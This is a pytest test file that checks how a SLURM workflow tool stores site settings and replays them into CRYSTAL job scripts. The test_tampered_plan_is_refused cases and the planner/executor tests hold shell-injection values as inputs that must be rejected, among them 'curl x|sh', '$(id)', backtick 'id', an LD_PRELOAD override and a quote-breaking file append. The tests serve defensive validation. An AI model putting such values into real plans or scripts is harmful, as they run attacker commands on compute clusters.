"""Workflow plans store the PLAN_G site keys once and replay them; a stored
value is checked again when a step script is written (D6.4, A12): a plan
edited by hand cannot put shell code into a job script. Keys from before
PLAN_G keep their skip-if-invalid behavior."""
import json
from types import SimpleNamespace

import pytest

from test_site_generic_cluster import _cluster
from test_site_jobscript import PROP, SCF, _deck, _env, _mace, _toml

from mace.submission import site

GOOD = {"mpi": {"launcher": "srun", "srun_mpi": "pmi2", "env": ["I_MPI_PMI_LIBRARY=/usr/lib64/libpmi2.so"]},
        "scratch": "/scratch/$USER", "crystal_bin_dir": "/opt/c23/bin", "crystal_exe": {"scf": "MPPcrystal"},
        "module_purge": False, "slurm_qos": "normal", "slurm_constraint": "epyc&ib",
        "slurm_extra": ["--exclusive"], "site_resources": {"scf": {"cpus_per_task": 2}}}


def test_plan_resources_stores_the_new_keys(tmp_path):
    _toml(tmp_path, '[slurm]\nqos = "normal"\nconstraint = "epyc&ib"\nextra = ["--exclusive"]\n'
                    '[mpi]\nlauncher = "srun"\nsrun_mpi = "pmi2"\nenv = ["I_MPI_PMI_LIBRARY=/usr/lib64/libpmi2.so"]\n'
                    '[paths]\nscratch = "/scratch/$USER"\n[crystal]\nbin_dir = "/opt/c23/bin"\nscf = "MPPcrystal"\n'
                    '[modules]\npurge = false\n[resources]\ncpus_per_task = 2\n')
    stored = site.plan_resources(_env(tmp_path))
    for k, v in GOOD.items():
        if k == "crystal_exe":
            assert stored[k] == {"scf": "MPPcrystal", "prop": "Pproperties"}
        elif k == "site_resources":
            assert stored[k] == {"scf": {"cpus_per_task": 2}, "prop": {"cpus_per_task": 2}}
        else:
            assert stored[k] == v, k
    assert "module" not in stored                      # CRYSTAL from bin_dir


def test_no_new_keys_without_settings(tmp_path):
    stored = site.plan_resources(_env(tmp_path))
    assert set(stored) <= {"account", "module", "modules", "module_root_from_path", "partition",
                           "python_modules", "python_executable", "queue_limits"}


def test_replay_applies_every_key():
    out = site.customize_workflow_text(SCF.read_text(), dict(GOOD))
    assert "srun --mpi=pmi2 -c $SLURM_CPUS_PER_TASK /opt/c23/bin/MPPcrystal" in out
    assert "export I_MPI_PMI_LIBRARY=/usr/lib64/libpmi2.so" in out
    assert 'if [ -d "/scratch/$MACE_USER" ]; then' in out
    assert "module load CRYSTAL/" not in out and site.PURGE_COMMENT in out
    for line in ("echo '#SBATCH --qos=normal' >> $1.sh", "echo '#SBATCH --constraint=epyc&ib' >> $1.sh",
                 "echo '#SBATCH --exclusive' >> $1.sh", "echo '#SBATCH --cpus-per-task=2' >> $1.sh"):
        assert line in out
    prop = site.customize_workflow_text(PROP.read_text(), dict(GOOD))
    assert "echo '#SBATCH --cpus-per-task=1' >> $1.sh" in prop      # an scf-only size
    assert "/opt/c23/bin/Pproperties" in prop


@pytest.mark.parametrize("key,value,named", [
    ("mpi", {"launcher": "srun", "env": ["X=a;curl x|sh"]}, "mpi.env[0]"),
    ("mpi", {"launcher": "mpiexec {exe}"}, "mpi.launcher"),
    ("mpi", {"launcher": "srun", "srun_mpi": "pmix;id"}, "mpi.srun_mpi"),
    ("mpi", {"env": ["LD_PRELOAD=/x.so"]}, "mpi.env[0]"),
    ("crystal_bin_dir", "/x;id", "crystal_bin_dir"),
    ("crystal_bin_dir", "/opt/../../bin", "crystal_bin_dir"),
    ("crystal_exe", {"scf": "$(id)"}, "crystal_exe.scf"),
    ("scratch", "/scratch/$(id)", "scratch"),
    ("slurm_extra", ["--ntasks=4"], "slurm_extra"),
    ("slurm_extra", ["--x' >> /tmp/y; echo '"], "slurm_extra"),
    ("slurm_qos", "q'x", "slurm_qos"),
    ("slurm_constraint", "a b", "slurm_constraint"),
    ("module_purge", "maybe", "module_purge"),
    ("site_resources", {"scf": {"nodes": "1;id"}}, "site_resources.scf.nodes"),
    ("site_resources", {"scf": {"ntasks": 4}}, "site_resources.scf"),
])
def test_tampered_plan_is_refused(key, value, named):
    with pytest.raises(site.SiteConfigError) as e:
        site.customize_workflow_text(SCF.read_text(), {key: value})
    assert f"workflow plan: {named}" in str(e.value)


def test_old_keys_keep_skip_if_invalid():
    text = SCF.read_text()
    assert site.customize_workflow_text(text, {"partition": "a;b", "python_modules": ["x y"],
                                               "python_executable": "/a b"}) == text


def test_executor_step_is_not_generated_from_a_tampered_plan(tmp_path):
    from mace.workflow.executor import WorkflowExecutor
    stub = SimpleNamespace(work_dir=tmp_path, isolation_mode="isolated")
    with pytest.raises(site.SiteConfigError):
        WorkflowExecutor.apply_script_customizations(
            stub, SCF.read_text(), {"resources": {"account": None, "crystal_bin_dir": "/x;id"}, "workflow_id": "w"})


def test_planner_step_is_not_generated_from_a_tampered_plan(tmp_path):
    from mace.workflow.planner import WorkflowPlanner
    stub = SimpleNamespace(work_dir=tmp_path)
    cfg = {"resources": {"ntasks": 32, "walltime": "1:00:00", "mpi": {"env": ["A=`id`"]}}, "workflow_id": "w"}
    q = {"max_jobs": 950, "reserve_slots": 50, "max_submit_batch": 10, "max_recovery_attempts": 3}
    with pytest.raises(site.SiteConfigError):
        WorkflowPlanner.apply_script_customizations(stub, SCF.read_text(), cfg, q)


def test_workflow_end_to_end_replays_the_plan(tmp_path):
    """mace submit --progress on another cluster with [mpi] srun: every step
    script and every submitted script starts CRYSTAL with srun."""
    env, fake = _cluster(tmp_path, owner=False)
    _toml(tmp_path, '[mpi]\nlauncher = "srun"\nsrun_mpi = "pmix"\n[slurm]\nqos = "normal"\n')
    from test_array_default_path_golden import SP_D12
    d = tmp_path / "decks"
    _deck(d, "m_opt.d12", SP_D12.replace("6 0.125 0.125 0.125\nEND\n",
                                         "6 0.125 0.125 0.125\nOPTGEOM\nFULLOPTG\nENDOPT\nEND\n", 1))
    p = _mace(tmp_path, env, "submit", "--progress", "opt_sp", "decks")
    assert p.returncode == 0, p.stdout[-3000:] + p.stderr[-3000:]
    (plan,) = sorted((d / "workflow_configs").glob("workflow_plan_*.json"))
    steps = json.loads(plan.read_text())["step_configurations"]
    stored = [c["resources"] for s in steps.values() for c in s["slurm_config"]["scripts"].values()]
    assert stored and all(r.get("mpi", {}).get("launcher") == "srun" for r in stored)
    for c in sorted((d / "workflow_scripts").glob("*.sh")):
        t = c.read_text()
        assert "  srun --mpi=pmix $EBROOTCRYSTAL/bin/Pcrystal" in t and "echo '#SBATCH --qos=normal' >> $1.sh" in t
    scripts = [c["script_text"] for c in fake.calls("sbatch")]
    assert scripts and all("  srun --mpi=pmix " in s and "#SBATCH --qos=normal" in s for s in scripts)
